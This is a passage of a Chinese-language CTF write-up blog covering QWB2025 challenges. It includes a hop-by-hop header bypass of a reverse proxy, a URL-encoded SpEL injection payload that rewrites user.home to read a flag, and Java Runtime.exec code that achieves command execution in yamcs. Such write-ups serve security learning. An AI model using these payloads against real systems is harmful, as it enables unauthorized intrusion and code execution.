</span></span></code></pre></div><p>根据 ReverseProxy 的这份源码 <code>ServeHTTP->Director->removeHopByHopHeaders</code>，只需要将想要删除的 header 放入 Connection 中即可：</p><p><img alt=alt loading=lazy src=/images/QWB2025/1.png></p><p>再跟随重定向到 <code>/dashboard</code>：</p><p><img alt=alt loading=lazy src=/images/QWB2025/2.png></p><h2 id=bbjv>bbjv<a hidden class=anchor aria-hidden=true href=#bbjv>#</a></h2><p>GatewayController：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@RestController</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>GatewayController</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>final</span> EvaluationService evaluationService;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>GatewayController</span>(EvaluationService evaluationService) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>evaluationService</span> <span style=color:#f92672>=</span> evaluationService;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@GetMapping</span>({<span style=color:#e6db74>&#34;/check&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>checkRule</span>(<span style=color:#a6e22e>@RequestParam</span> String rule) <span style=color:#66d9ef>throws</span> FileNotFoundException {
</span></span><span style=display:flex><span>        String result <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>evaluationService</span>.<span style=color:#a6e22e>evaluate</span>(rule);
</span></span><span style=display:flex><span>        File flagFile <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;user.home&#34;</span>), <span style=color:#e6db74>&#34;flag.txt&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flagFile.<span style=color:#a6e22e>exists</span>()) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                BufferedReader br <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BufferedReader(<span style=color:#66d9ef>new</span> FileReader(flagFile));
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                    String content <span style=color:#f92672>=</span> br.<span style=color:#a6e22e>readLine</span>();
</span></span><span style=display:flex><span>                    result <span style=color:#f92672>=</span> result <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;br&gt;&lt;b&gt;�� Flag:&lt;/b&gt; &#34;</span> <span style=color:#f92672>+</span> content;
</span></span><span style=display:flex><span>                    br.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>finally</span> {
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> result;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>EvaluationService：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@Service</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/service/EvaluationService.class */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>EvaluationService</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>final</span> ExpressionParser parser <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SpelExpressionParser();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>final</span> EvaluationContext context;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>EvaluationService</span>(EvaluationContext context) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>context</span> <span style=color:#f92672>=</span> context;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>evaluate</span>(String expression) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Object result <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>parser</span>.<span style=color:#a6e22e>parseExpression</span>(expression, <span style=color:#66d9ef>new</span> TemplateParserContext()).<span style=color:#a6e22e>getValue</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>context</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Result: &#34;</span> <span style=color:#f92672>+</span> String.<span style=color:#a6e22e>valueOf</span>(result);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Error: &#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Dockerfile：</p><pre tabindex=0><code>FROM docker.io/openjdk:21-jdk-slim

WORKDIR /app

COPY app.jar /app/app.jar
COPY flag.txt /tmp/flag.txt

EXPOSE 8080

CMD [&#34;java&#34;, &#34;-jar&#34;, &#34;app.jar&#34;]
</code></pre><p>home目录下是没有flag.txt的，可以通过SpEL注入将<code>user.home</code>改为<code>/tmp</code>，payload：</p><pre tabindex=0><code>%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D
</code></pre><p><img alt=alt loading=lazy src=/images/QWB2025/3.png></p><h2 id=yamcs>yamcs<a hidden class=anchor aria-hidden=true href=#yamcs>#</a></h2><p>存在命令执行的功能，输出到<code>Sunsensor_Beta</code>里：</p><p><img alt=alt loading=lazy src=/images/QWB2025/4.png></p><p>尝试执行<code>whoami</code>，报错：</p><pre tabindex=0><code> Cannot compile expression &#39; java.util.Scanner s = new java.util.Scanner( Runtime.getRuntime().exec(&#34;whoami&#34;).getInputStream()); out0.setStringValue(s.next().trim()); &#39;: Line 2, Column 71: Thrown exception of type &#34;java.io.IOException&#34; is neither caught by a &#34;try...catch&#34; block nor declared in the &#34;throws&#34; clause of the declaring function 
</code></pre><p>代码里加上try-cacth即可RCE：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>try</span> { 
</span></span><span style=display:flex><span>    java.<span style=color:#a6e22e>util</span>.<span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>util</span>.<span style=color:#a6e22e>Scanner</span>( Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;cat /flag&#34;</span>).<span style=color:#a6e22e>getInputStream</span>());
</span></span><span style=display:flex><span>    out0.<span style=color:#a6e22e>setStringValue</span>(s.<span style=color:#a6e22e>next</span>().<span style=color:#a6e22e>trim</span>()); 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#66d9ef>catch</span> (Exception e) { 
</span></span><span style=display:flex><span>    out0.<span style=color:#a6e22e>setStringValue</span>(<span style=color:#e6db74>&#34;ERROR&#34;</span>); 
</span></span><span style=display:flex><span>} 
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>